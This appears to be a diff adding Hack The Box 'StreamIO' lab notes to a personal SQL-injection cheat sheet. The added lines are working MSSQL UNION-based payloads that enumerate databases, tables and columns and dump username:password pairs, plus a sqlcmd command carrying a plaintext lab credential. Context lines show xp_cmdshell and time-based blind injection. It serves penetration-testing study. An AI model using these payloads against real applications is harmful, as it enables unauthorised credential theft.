@@ -212,3 +212,34 @@ EXECUTE xp_cmdshell 'whoami';
 - **Goal**: Gather information from a database when no data is returned to the user.
 - **Method**: Use SQL commands that delay the response.
 - **Example**: `'; IF (SELECT COUNT(*) FROM users) > 5 WAITFOR DELAY '0:0:10' --`. If the response is delayed, the statement is true.
+
+
+
+### Notes from HTB StreamIO
+
+```
+It was MSSQL, and ended up blocking just 'OR' but not 'AND'
+
+1408' OR 1=1     # BLocked
+
+## Trial and Error to figure out there are six columns
+-1' UNION SELECT 1,2,3,4,5,6--
+
+## Get Version
+-1' UNION SELECT 1,@@version,3,4,5,6--
+
+## Get list of Databases
+-1' UNION SELECT 1,name,3,4,5,6  FROM master.dbo.sysdatabases--
+
+## Dig into the streamio database
+-1' UNION SELECT 1,name,3,4,5,6  FROM streamio..sysobjects WHERE xtype ='U';-- -
+
+-1' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
+
+-1' UNION SELECT 1,CONCAT(username,':',password),3,4,5,6 FROM users;-- -
+
+
+Interesting way to quick connect to a database, mssql, on cli and get data you need:
+
+sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
+```
